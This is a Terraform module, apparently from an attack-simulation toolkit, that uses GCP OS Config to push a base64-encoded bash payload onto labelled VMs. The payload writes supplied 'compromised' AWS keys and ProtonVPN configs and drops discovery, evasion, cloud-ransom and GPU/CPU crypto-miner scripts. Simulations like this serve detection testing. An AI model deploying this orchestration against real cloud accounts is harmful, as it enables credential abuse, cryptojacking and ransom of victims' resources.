locals {
    attack_dir = "/cloud-tunnel"
    script = "discovery.sh"
    script_type = "aws-cli"
    attack_type = "compromised_keys"
    aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    
    if docker ps | grep aws-cli || docker ps | grep terraform; then 
        log "Attempt to start new session skipped - aws-cli or terraform docker is running..."; 
    else
        MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null
        log "Starting new session no existing session detected..."
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
        cd ${local.attack_dir}
        ${local.aws_creds}
        echo '${base64encode(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
        echo '${base64encode(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
        echo '${base64encode(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
        echo '${base64encode(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
        echo '${base64encode(local.protonvpn-paid)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-paid
        echo '${base64encode(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
        echo '${base64encode(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
        echo '${base64encode(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
        echo '${base64encode(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
        echo '${base64encode(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
        echo '${base64encode(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
        echo '${base64encode(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
        for i in $(echo "US US-FREE#34 NL-FREE#148 JP-FREE#3"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
        while ! which docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        for i in $(echo "AU CR IS JP LV NL NZ SG SK US"); do cp .env-protonvpn-paid .env-protonvpn-paid-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-paid-$i; done
        while ! which docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "Starting simulation..."
        if [ "${var.protonvpn_tier}" == "0" ]; then
        log "Protonvpn tier is free tier: ${var.protonvpn_tier}"
        log "Starting auto-free.sh as background job..."
        bash auto-free.sh & >> $LOGFILE 2>&1
        else
        log "Protonvpn tier is paid tier: ${var.protonvpn_tier}"
        log "Starting auto-paid.sh as background job..."
        bash auto-paid.sh&  >> $LOGFILE 2>&1
        fi;
    fi;
    EOT
    base64_payload = base64encode(local.payload)

    protonvpn       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    protonvpn-paid       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = 2
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    protonvpn-baseline  = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = "US"
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    auto-free   = templatefile(
                                "${path.module}/resources/auto-free.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                }
                            )
    auto-paid   = templatefile(
                                "${path.module}/resources/auto-paid.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                }
                            )
    baseline    = templatefile(
                                "${path.module}/resources/baseline.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    discovery   = templatefile(
                                "${path.module}/resources/discovery.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    evasion     = templatefile(
                                "${path.module}/resources/evasion.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudransom = templatefile(
                                "${path.module}/resources/cloudransom.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudcrypto = templatefile(
                                "${path.module}/resources/cloudcrypto.tf.tpl",
                                {
                                    name = "crypto-gpu-miner-${var.environment}-${var.deployment}"
                                    instances = 12
                                    wallet = var.ethermine_wallet
                                    region = var.region
                                }
                            )
    hostcrypto  = templatefile(
                                "${path.module}/resources/hostcrypto.tf.tpl",
                                {
                                    name = "crypto-cpu-miner-${var.environment}-${var.deployment}"
                                    region = var.region
                                    instances = 1
                                    minergate_user = var.minergate_user
                                }
                            )
    start       = templatefile(
                                "${path.module}/resources/start.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
}

#####################################################
# GCP OSCONFIG
#####################################################

locals {
    resource_name = "${replace(substr(var.tag,0,35), "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
}



resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "this" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "${local.resource_name}"
  description = "Attack automation"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = jsondecode(<<-EOT
                            { 
                              "${var.tag}": "true",
                              "deployment": "${var.deployment}",
                              "environment": "${var.environment}"
                            }
                            EOT
                          )
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id        = "${local.resource_name}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            
            script           = "if echo '${sha256(local.base64_payload)} /tmp/payload_${var.tag}' | sha256sum --check --status; then exit 100; else exit 101; fi"
          }
          enforce {
            interpreter      = "SHELL"
            
            script           = "echo ${local.base64_payload} | tee /tmp/payload_${var.tag} | base64 -d | bash & exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 50
    }
    min_wait_duration = var.timeout
  }
}